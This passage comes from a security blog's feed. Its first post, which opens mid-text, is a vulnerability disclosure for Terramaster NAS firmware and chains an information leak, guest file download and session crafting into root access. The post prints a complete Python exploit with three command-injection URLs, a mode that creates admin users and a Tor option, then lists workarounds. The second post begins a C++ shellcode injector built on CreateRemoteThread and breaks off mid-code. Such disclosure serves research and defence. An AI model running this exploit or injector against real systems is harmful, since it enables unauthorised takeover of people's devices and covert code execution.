<p>Luckily this can be easily obtained by either visiting the <code>m1.php</code> and <code>m2.php</code> pages or by contacting the APIs at <code>/module/api.php?mobile/wapNasIPS</code> and <code>/module/api.php?mobile/webNasIPS</code>.</p>
<p>To correctly contact those we need the following headers to be set:</p>
<ul>
<li><code>User-Device:TNAS</code></li>
<li><code>User-Agent:TNAS</code></li>
</ul>
<p>as per <code>include/class/mobile.class.php</code> constructor:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">function</span> __construct() {
    <span style="color:#6ab825;font-weight:bold">parent</span>::<span style="color:#bbb">__construct</span>();
    <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">start</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">mtime</span>();

    <span style="color:#6ab825;font-weight:bold">if</span> (isset(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>]) &amp;&amp; <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>] == <span style="color:#ed9d13">&#34;TNAS&#34;</span>) <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>] = <span style="color:#ed9d13">&#34;TNAS&#34;</span>;
    <span style="color:#999;font-style:italic">//排除非法请求...
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!in_array(Action, self::<span style="color:#40ffff">$notHeader</span>)) {
        <span style="color:#6ab825;font-weight:bold">if</span> (!strstr(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#ed9d13">&#34;TNAS&#34;</span>) || !isset(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_AUTHORIZATION&#39;</span>]) || <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">REQUESTCODE</span> != <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_AUTHORIZATION&#39;</span>]) {
            <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">output</span>(<span style="color:#ed9d13">&#34;Illegal request, please use genuine software!&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
        }
    }
<span style="color:#999;font-style:italic">/*...*/</span>
</code></pre></div><p>and functions:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">webNasIPS</span>() {
    <span style="color:#6ab825;font-weight:bold">if</span> (strstr(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#ed9d13">&#34;TNAS&#34;</span>)) {
<span style="color:#999;font-style:italic">/*...*/</span>

<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">wapNasIPS</span>() {
    <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>] == <span style="color:#ed9d13">&#34;TNAS&#34;</span>) {
<span style="color:#999;font-style:italic">/*...*/</span>
</code></pre></div><p>Luckily for us, the functions we need to contact are inside the array <code>notHeader</code> which means we do not need the additional <code>HTTP_AUTHORIZATION</code> header for now.</p>
<p>Setting the headers gets us the info we need, plus a very handy json:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#6ab825;font-weight:bold">&#34;code&#34;</span>:<span style="color:#6ab825;font-weight:bold">true</span>,<span style="color:#6ab825;font-weight:bold">&#34;sessionid&#34;</span>:<span style="color:#ed9d13">&#34;3902782408ebacea7cda7933c75bfbba&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;msg&#34;</span>:<span style="color:#ed9d13">&#34;wapNasIPS successful&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;data&#34;</span>:{<span style="color:#6ab825;font-weight:bold">&#34;PWD&#34;</span>:<span style="color:#ed9d13">&#34;$1$k2eh7cjZ$rlR5mBvLxrjzQCQQJ/f11/&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;IFC&#34;</span>:<span style="color:#ed9d13">&#34;10.0.0.2&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;ADDR&#34;</span>:<span style="color:#ed9d13">&#34;6cbfb5023f24&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;SAT&#34;</span>:<span style="color:#3677a9">1</span>,<span style="color:#6ab825;font-weight:bold">&#34;DAT&#34;</span>:[{<span style="color:#6ab825;font-weight:bold">&#34;hostname&#34;</span>:<span style="color:#ed9d13">&#34;nas&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;firmware&#34;</span>:<span style="color:#ed9d13">&#34;TOS3_A1.0_4.2.17&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;sn&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;version&#34;</span>:<span style="color:#ed9d13">&#34;2110301418&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;network&#34;</span>:<span style="color:#ed9d13">&#34;eth0&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;ip&#34;</span>:<span style="color:#ed9d13">&#34;10.0.0.100&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;mask&#34;</span>:<span style="color:#ed9d13">&#34;255.255.255.0&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;mac&#34;</span>:<span style="color:#ed9d13">&#34;6c:bf:b5:02:3f:24&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;service&#34;</span>:[{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;http_ssl&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;5443&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;http&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;8181&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;sys&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;8181&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;channel&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;pt&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;ftp&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">21</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;web_dav&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;smb&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>}]}]},<span style="color:#6ab825;font-weight:bold">&#34;time&#34;</span>:<span style="color:#3677a9">0.2337968349456787</span>}
</code></pre></div><p>guess who&rsquo;s password hash is in <code>PWD</code>? Correct, the admin&rsquo;s!</p>
<h3 id="crafting-admins-privilege-escalation">Crafting admins (Privilege escalation)</h3>
<p>Using the session crafting method explained earlier and the information disclosure discussed above we can easily craft an administrator session.</p>
<p>During my testing this did not work with the default &ldquo;admin&rdquo; account, this is because if during the setup the user specifies a custom username(in my case n0tme) we are out of luck&hellip; or are we?</p>
<p>I mean we can brute force the username, but this is lame, considering that it might end up not working, we want a reliable exploit <del>to sell to ZDI</del>.</p>
<p>This is quickly solvable by looking at the lovely API from <code>/include/class/mobile.class.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">fileDownload</span>() {
    <span style="color:#40ffff">$filepath</span> = realpath(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;path&#39;</span>]);
    file_downloading(<span style="color:#40ffff">$filepath</span>);
}
</code></pre></div><p>nice, a API which is used for downloading files, I bet you are wondering if we could download a file as a guest user&hellip; yup - that was too easy wasn&rsquo;t it?
So we can call the <code>fileDownload</code> API then:</p>
<ul>
<li>get the <code>/etc/groups</code> file</li>
<li>find all users in the admin group</li>
<li>try the hash with each admin until we succeed</li>
</ul>
<p>The only extra requirement for the fileDownload API is the <code>signature</code> and <code>timestamp</code> headers which should be set to <code>tos_encrypted_str(timestamp)</code> and the <code>timestamp</code> of the request, respectively. This can be done easily since we have all the pieces.</p>
<h3 id="chaining">Chaining</h3>
<p>Now we just have to go over it all, again, in the right order:</p>
<ol>
<li>Setup the <code>User-Device</code> and <code>User-Agent</code> to <code>TNAS</code></li>
<li>Grab the admin hash and MAC address from <code>/module/api.php?mobile/wapNasIPS</code> or <code>/module/api.php?mobile/webNasIPS</code></li>
<li>Call the <code>fileDownload</code> API to get the <code>/etc/group</code></li>
<li>Pick one of the 3 RCEs and pwn the NAS.</li>
</ol>
<p>Finally, here is the exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic">#/bin/env python</span>

<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">Product: Terramaster F4-210, Terramaster F2-210
</span><span style="color:#ed9d13">Version: TOS 4.2.X (4.2.15-2107141517)
</span><span style="color:#ed9d13">Author: n0tme (thatsn0tmysite)
</span><span style="color:#ed9d13">Description: Chain from unauthenticated to root via session crafting.
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>

<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">urllib3</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">json</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">argparse</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">hashlib</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">time</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>

TARGET = <span style="color:#6ab825;font-weight:bold">None</span> 
MAC_ADDRESS = <span style="color:#6ab825;font-weight:bold">None</span>
PWD = <span style="color:#6ab825;font-weight:bold">None</span>
TIMESTAMP = <span style="color:#6ab825;font-weight:bold">None</span> 

<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">tos_encrypt_str</span>(toencrypt):
    key = MAC_ADDRESS[<span style="color:#3677a9">6</span>:] 
    <span style="color:#6ab825;font-weight:bold">return</span> hashlib.md5(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>key<span style="color:#ed9d13">}{</span>toencrypt<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)).hexdigest()

<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">user_session</span>(session, username):
    session.cookies.clear()
    cookies = {<span style="color:#ed9d13">&#34;kod_name&#34;</span>:username, <span style="color:#ed9d13">&#34;kod_token&#34;</span>:tos_encrypt_str(PWD)}
    <span style="color:#6ab825;font-weight:bold">if</span> username == <span style="color:#ed9d13">&#34;guest&#34;</span>:
        cookies = {<span style="color:#ed9d13">&#34;kod_name&#34;</span>:<span style="color:#ed9d13">&#34;guest&#34;</span>, <span style="color:#ed9d13">&#34;kod_token&#34;</span>:tos_encrypt_str(<span style="color:#ed9d13">&#34;&#34;</span>)}
    
    <span style="color:#6ab825;font-weight:bold">for</span> name,value <span style="color:#6ab825;font-weight:bold">in</span> cookies.items():
        session.cookies[name] = value

<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">download</span>(session, path, save_as=<span style="color:#6ab825;font-weight:bold">None</span>):
    user_session(session, <span style="color:#ed9d13">&#34;guest&#34;</span>)
    r=session.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/fileDownload&#34;</span>, data={<span style="color:#ed9d13">&#34;path&#34;</span>:path})
    filename = os.path.basename(path)
    <span style="color:#6ab825;font-weight:bold">if</span> save_as <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">not</span> <span style="color:#6ab825;font-weight:bold">None</span>:
        filename = save_as
    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(filename, <span style="color:#ed9d13">&#34;wb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> file:
        file.write(r.content)

<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_admin_users</span>(session):
    download(session, <span style="color:#ed9d13">&#34;/etc/group&#34;</span>, save_as=<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>)
    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>, <span style="color:#ed9d13">&#34;r&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> groups:
        <span style="color:#6ab825;font-weight:bold">for</span> line <span style="color:#6ab825;font-weight:bold">in</span> groups:
            line = line.strip()
            fields = line.split(<span style="color:#ed9d13">&#39;:&#39;</span>)
            <span style="color:#6ab825;font-weight:bold">if</span> fields[<span style="color:#3677a9">0</span>] == <span style="color:#ed9d13">&#34;admin&#34;</span>:
                users = fields[<span style="color:#3677a9">3</span>].split(<span style="color:#ed9d13">&#34;,&#34;</span>)
                os.remove(<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>)
                <span style="color:#6ab825;font-weight:bold">return</span> users  

<span style="color:#6ab825;font-weight:bold">if</span> __name__ == <span style="color:#ed9d13">&#39;__main__&#39;</span>:
    p = argparse.ArgumentParser()
    p.add_argument(dest=<span style="color:#ed9d13">&#34;target&#34;</span>, help=<span style="color:#ed9d13">&#34;Target URL (e.g. http://10.0.0.100:8181)&#34;</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;--cmd&#34;</span>, dest=<span style="color:#ed9d13">&#34;cmd&#34;</span>, help=<span style="color:#ed9d13">&#34;Command to run&#34;</span>, default=<span style="color:#ed9d13">&#34;id&#34;</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;-d&#34;</span>, <span style="color:#ed9d13">&#34;--download&#34;</span>, dest=<span style="color:#ed9d13">&#34;download&#34;</span>, help=<span style="color:#ed9d13">&#34;Only download file&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;-o&#34;</span>, <span style="color:#ed9d13">&#34;--output&#34;</span>, dest=<span style="color:#ed9d13">&#34;save_as&#34;</span>, help=<span style="color:#ed9d13">&#34;Save downloaded file as&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;-c&#34;</span>, <span style="color:#ed9d13">&#34;--create&#34;</span>, dest=<span style="color:#ed9d13">&#34;create&#34;</span>, help=<span style="color:#ed9d13">&#34;Only create admin user (format should be admin:password)&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;--tor&#34;</span>, dest=<span style="color:#ed9d13">&#34;tor&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">False</span>, action=<span style="color:#ed9d13">&#34;store_true&#34;</span>, help=<span style="color:#ed9d13">&#34;Use TOR&#34;</span>)
    p.add_argument(<span style="color:#ed9d13">&#34;--rce&#34;</span>, dest=<span style="color:#ed9d13">&#34;rce&#34;</span>, default=<span style="color:#3677a9">0</span>, <span style="color:#24909d">type</span>=<span style="color:#24909d">int</span>, help=<span style="color:#ed9d13">&#34;RCE to use (1 and 2 have no output)&#34;</span>)
    args = p.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    TARGET = args.target 

    s = requests.Session()
    <span style="color:#6ab825;font-weight:bold">if</span> args.tor:
        s.proxies = {<span style="color:#ed9d13">&#34;http&#34;</span>:<span style="color:#ed9d13">&#34;socks5://127.0.0.1:9050&#34;</span>, <span style="color:#ed9d13">&#34;https&#34;</span>: <span style="color:#ed9d13">&#34;socks5://127.0.0.1:9050&#34;</span>}
    s.headers.update({<span style="color:#ed9d13">&#34;user-device&#34;</span>:<span style="color:#ed9d13">&#34;TNAS&#34;</span>, <span style="color:#ed9d13">&#34;user-agent&#34;</span>:<span style="color:#ed9d13">&#34;TNAS&#34;</span>})
    
    r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/wapNasIPS&#34;</span>)
    <span style="color:#6ab825;font-weight:bold">try</span>:
        j = r.json()
        PWD = j[<span style="color:#ed9d13">&#34;data&#34;</span>][<span style="color:#ed9d13">&#34;PWD&#34;</span>]
        MAC_ADDRESS = j[<span style="color:#ed9d13">&#34;data&#34;</span>][<span style="color:#ed9d13">&#34;ADDR&#34;</span>]
    <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">KeyError</span>:
        exit(<span style="color:#3677a9">1</span>)
    
    TIMESTAMP = <span style="color:#24909d">str</span>(<span style="color:#24909d">int</span>(time.time()))
    s.headers.update({<span style="color:#ed9d13">&#34;signature&#34;</span>: tos_encrypt_str(TIMESTAMP), <span style="color:#ed9d13">&#34;timestamp&#34;</span>: TIMESTAMP})
    s.headers.update({<span style="color:#ed9d13">&#34;authorization&#34;</span>: PWD})

    <span style="color:#6ab825;font-weight:bold">if</span> args.download != <span style="color:#6ab825;font-weight:bold">None</span>:
        download(s, args.download, save_as=args.save_as)
        exit(<span style="color:#3677a9">0</span>)

    <span style="color:#999;font-style:italic">#RCEs</span>
    RCEs=[<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/del&amp;id=0&amp;name=;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx%23&#34;</span>,
          <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/hand_app&amp;name=;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx.tpk&#34;</span>, <span style="color:#999;font-style:italic">#BLIND</span>
          <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/app_start_stop&amp;id=ups&amp;start=0&amp;name=donotcare.*.oexe;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx&#34;</span>] <span style="color:#999;font-style:italic">#BLIND</span>
    
    <span style="color:#6ab825;font-weight:bold">for</span> admin <span style="color:#6ab825;font-weight:bold">in</span> get_admin_users(s):
        user_session(s, admin)
        <span style="color:#6ab825;font-weight:bold">if</span> args.create != <span style="color:#6ab825;font-weight:bold">None</span>:
            user, password = args.create.split(<span style="color:#ed9d13">&#34;:&#34;</span>) 
            groups = json.dumps([<span style="color:#ed9d13">&#34;allusers&#34;</span>, <span style="color:#ed9d13">&#34;admin&#34;</span>])
            r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/__construct&#34;</span>)
            r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/set_user_information&#34;</span>, data={<span style="color:#ed9d13">&#34;groups&#34;</span>:groups, <span style="color:#ed9d13">&#34;username&#34;</span>:user,<span style="color:#ed9d13">&#34;operation&#34;</span>:<span style="color:#ed9d13">&#34;0&#34;</span>,<span style="color:#ed9d13">&#34;password&#34;</span>:password,<span style="color:#ed9d13">&#34;capacity&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>})
            <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#34;create user successful!&#34;</span> <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">str</span>(r.content, <span style="color:#ed9d13">&#34;utf8&#34;</span>):
                <span style="color:#24909d">print</span>(r.content)
                <span style="color:#6ab825;font-weight:bold">break</span>
            <span style="color:#6ab825;font-weight:bold">continue</span>

        r = s.get(RCEs[args.rce])
        content = <span style="color:#24909d">str</span>(r.content, <span style="color:#ed9d13">&#34;utf-8&#34;</span>)
        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#34;&lt;!--user login--&gt;&#34;</span> <span style="color:#6ab825;font-weight:bold">not</span> <span style="color:#6ab825;font-weight:bold">in</span> content: 
            <span style="color:#24909d">print</span>(content)
    exit(<span style="color:#3677a9">0</span>)
</code></pre></div><h2 id="fix-it">Fix it</h2>
<p>This should be handled by Terramaster, not yourself, but in case you do not want to wait for them to release a patch.
Here are a few workarounds, those are to be considered as complementary to each others:</p>
<ul>
<li>disconnect your NAS from the internet</li>
<li>change the guest user&rsquo;s password to a strong one (this prevents the session crafting as guest and file download)</li>
<li>patch <code>mobile.class.php</code> to not return the hash. Variable should be called <code>PWD</code>, just set it to &quot;&quot; or something.</li>
<li>remove the <code>m1.php</code> and <code>m2.php</code> files, not even sure what they are needed for&hellip; (to avoid leaking the MAC address)</li>
<li>patch as soon as this gets fixed by terramaster.</li>
</ul>
<p>As for the RCEs for authorized users a deeper look at the architecture of the application is required and I do not work for Terramaster, so I leave that up to them.</p>
<h2 id="conclusions">Conclusions</h2>
<p>I hope this will push Terramaster to step in and quickly fix this issue ASAP.
Now, I guess it&rsquo;s time to watch some <del>leaked Matrix</del> some XMAS movie&hellip; Die Hard.</p>
<p>Have fun and listen to more <a href="https://www.youtube.com/watch?v=D8K90hX4PrE">Daft Punk</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>Approaching Windows</title>
            <link>/posts/2021/06/approaching-windows/</link>
            <pubDate>Tue, 01 Jun 2021 00:41:45 +0200</pubDate>
            
            <guid>/posts/2021/06/approaching-windows/</guid>
            <description>Well, hello there! Last few weeks have been a little busy between my mere analog life and pwning industrial ovens work. Lately I have been banging my head against this thing known as Windows.
Its APIs to be precise, as I am trying to move out of my comfort zone of &amp;ldquo;development&amp;rdquo; (I am by no means a developer, but when I make stuff, it&amp;rsquo;s usually on Linux).
As a side note, while we&amp;rsquo;re talking about development, I recently decided to produce a rip-off of the amazing xsshunter and write it in Go.</description>
            <content type="html"><![CDATA[<p>Well, hello there! Last few weeks have been a little busy between my mere analog life and <del>pwning industrial ovens</del> work.
Lately I have been banging my head against this thing known as <strong>Windows</strong>.</p>
<p>Its APIs to be precise, as I am trying to move out of my comfort zone of &ldquo;development&rdquo; (I am by <strong>no means</strong> a developer, but when I make stuff, it&rsquo;s usually on Linux).</p>
<p>As a side note, while we&rsquo;re talking about development, I recently decided to produce a rip-off of the amazing <a href="https://xsshunter.com">xsshunter</a> and write it in Go.
Mostly as a learning exercise for Go stuff. It&rsquo;s coded like shit, and currenty on the low priority list, so feel free to hop in and <a href="https://github.com/thatsn0tmysite/xsserve">help</a>.</p>
<p>Now, back to Windows. While there are a lot of complaints I have, mostly about situations where you read the documentation and end up facing a dead end because whatever you are looking at is undocumented&hellip; and the only information you can find about the topic is from some temporary account on codeproject, which made a stackoverflow question 8 years ago, which he self-answered. For Windows XP, SP1.</p>
<p>Looking at you &ldquo;dwData&rdquo; pointers&hellip;</p>
<p>So, to try and keep this post half-useful, I am gonna paste here a shellcode injector written in both, C++ and Go; using the overly (ab)used CreateRemoteThread technique.</p>
<p>The idea is simple, we just create a thread on a remote process, and give it our shellcode to run, this will run inside another process and will stay &ldquo;in memory&rdquo;.
To do this we will need a way obtain a handle of a give process (<strong>OpenProcess</strong>), to allocate memory area and make it executable (<strong>VirtualAllocEx</strong> and <strong>VirtualProtectEx</strong>), to write to said area (<strong>WriteProcessMemory</strong>) and finally a way to create the remote thread  (<strong>CreateRemoteThread</strong>).</p>
<p>This is a pretty standard way. So let&rsquo;s get threading!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;processthreadsapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;memoryapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
	HANDLE hProc, hThread;
	LPVOID lpStartAddress;
	<span style="color:#6ab825;font-weight:bold">int</span> writeProcError;
	DWORD lpflOldProtect = PAGE_READWRITE;

	<span style="color:#999;font-style:italic">//Get a handle from the given pid
</span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	<span style="color:#6ab825;font-weight:bold">if</span> (!hProc) {
		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
	}

	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.	
</span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	<span style="color:#6ab825;font-weight:bold">if</span> (lpStartAddress == <span style="color:#24909d">NULL</span>) {
		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">2</span>;
	}

	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process,
</span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>);
	<span style="color:#6ab825;font-weight:bold">if</span> (writeProcError == <span style="color:#3677a9">0</span>) {
		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">3</span>;
	}

	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
